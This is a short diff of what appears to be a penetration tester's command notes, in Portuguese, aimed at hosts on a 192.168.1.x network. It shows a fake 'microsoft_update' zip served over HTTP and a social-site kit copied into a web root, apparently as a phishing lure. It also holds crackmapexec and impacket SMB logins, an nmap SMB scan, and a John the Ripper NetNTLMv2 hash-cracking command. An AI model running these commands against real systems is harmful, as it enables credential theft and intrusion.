@@ -19,13 +19,8 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
-Get-NetAdapter -Physical | Where-Object {$_.Status -eq "Up"}
 
-
-python3 /usr/share/doc/python3-impacket/examples/smbclient.py administrador@192.168.1.84
-
-nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb2-security-mode 192.168.1.84
-
+john --format=netntlmv2 hash_rs.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 crackmapexec smb 192.168.1.84 -u convidado -p ""
 
